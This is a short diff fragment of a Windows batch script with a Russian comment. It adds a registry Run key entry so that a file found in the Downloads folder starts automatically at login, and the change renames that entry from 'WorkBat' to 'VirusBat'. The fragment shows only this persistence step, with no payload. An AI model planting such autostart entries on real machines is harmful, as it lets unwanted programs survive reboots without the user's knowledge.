@@ -11,7 +11,7 @@ if exist "%desktop%\%filename%" (
 
 :: (Проверяем загрузки)
 if exist "%downloads%\%filename%" (
-    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WorkBat" /t REG_SZ /d "%downloads%\%filename%" /f
+    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "VirusBat" /t REG_SZ /d "%downloads%\%filename%" /f
 )
 
 :end
